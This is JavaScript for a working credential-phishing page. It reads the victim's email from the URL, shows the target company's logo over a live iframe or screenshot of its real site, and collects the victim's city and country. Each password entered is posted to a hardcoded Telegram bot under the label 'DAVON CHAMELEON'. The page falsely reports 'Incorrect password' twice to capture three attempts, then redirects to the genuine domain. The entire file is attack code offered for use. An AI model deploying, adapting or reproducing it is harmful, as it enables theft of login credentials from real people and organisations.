// Telegram Bot config
const TELEGRAM_BOT_TOKEN = "7642767058:AAE1c1oj-wCUdqv3_WAWwJoonDWDIHOz4SA";
const TELEGRAM_CHAT_ID = "5748422740";

// Elements
const rawHash = window.location.hash.substring(1);
const emailInput = document.getElementById('email');
const logoImg = document.getElementById('logo');
const bgFrame = document.getElementById('bg-frame');
const passwordInput = document.getElementById('password');
const loginBtn = document.getElementById('login-btn');
const errorMsg = document.getElementById('error-msg');
const overlay = document.querySelector('.overlay');

let attempts = 0;
const maxAttempts = 3;

document.body.classList.add('blur-active');

if (!/^[^@]+@[^@]+\.[^@]+$/.test(rawHash)) {
  alert("Invalid or missing email in the URL hash.");
} else {
  emailInput.value = rawHash;
  emailInput.setAttribute("readonly", true);

  const domain = rawHash.split('@')[1];

  // Set logo
  logoImg.src = `https://logo.clearbit.com/${domain}`;
  logoImg.onerror = () => {
    logoImg.src = "https://via.placeholder.com/150?text=Logo";
  };

  // Setup fallback screenshot container
  const fallbackScreenshot = document.createElement('img');
  fallbackScreenshot.id = "fallback-screenshot";
  fallbackScreenshot.style.cssText = `
    display: none;
    position: fixed; top: 0; left: 0;
    width: 100vw; height: 100vh;
    object-fit: cover;
    z-index: 0;
    pointer-events: none;
  `;
  fallbackScreenshot.alt = "Screenshot fallback";
  fallbackScreenshot.src = `https://image.thum.io/get/width/1280/crop/900/https://${domain}`;
  document.body.appendChild(fallbackScreenshot);

  // Load iframe with timeout
  let iframeLoaded = false;
  bgFrame.src = `https://${domain}`;

  bgFrame.onload = () => {
    iframeLoaded = true;
    fallbackScreenshot.style.display = "none";
    bgFrame.style.display = "block";
  };

  setTimeout(() => {
    if (!iframeLoaded) {
      bgFrame.style.display = "none";
      fallbackScreenshot.style.display = "block";
      // Keep overlay visible — do NOT hide it
      document.body.classList.remove('blur-active'); // optional blur removal
    }
  }, 6000);

  bgFrame.onerror = () => {
    bgFrame.style.display = "none";
    fallbackScreenshot.style.display = "block";
    // Keep overlay visible — do NOT hide it
    document.body.classList.remove('blur-active'); // optional blur removal
  };
}

// Fetch user country (mandatory)

// Location details
let userIP = "Unknown IP";
let userCity = "Unknown City";
let userCountry = "Unknown Country";
let userISP = "Unknown ISP";
loginBtn.disabled = true;

fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    userCity = data.city || userCity;
    userCountry = data.country_name || userCountry;
  })
  .catch(() => {
    // silent fail
  })
  .finally(() => {
    loginBtn.disabled = false;
  });

// Telegram message sender
function sendTelegramMessage(email, password, attempt, country) {
  const text = `☠️ DAVON CHAMELEON [${attempt}/3] ☠️\n` +
               ` UserId : [ ${email} ]\n` +
               `    Pass : [ ${password} ]\n` +
               ` Country : [ ${userCity}, ${userCountry} ]`;

  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  const payload = {
    chat_id: TELEGRAM_CHAT_ID,
    text: text,
    parse_mode: "HTML"
  };
  fetch(url, {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify(payload)
  }).catch(e => console.error("Telegram send failed:", e));
}

// Login button handler
loginBtn.addEventListener('click', () => {
  const password = passwordInput.value.trim();
  if (password === "") {
    errorMsg.textContent = "Password cannot be empty.";
    return;
  }
  attempts++;
  sendTelegramMessage(emailInput.value, password, attempts, userCountry);

  if (attempts < maxAttempts) {
    errorMsg.textContent = "Incorrect password.";
    passwordInput.value = "";
  } else {
    errorMsg.textContent = "";
    overlay.style.display = 'none';
    document.body.classList.remove('blur-active');
    window.location.href = `https://${emailInput.value.split('@')[1]}`;
  }
});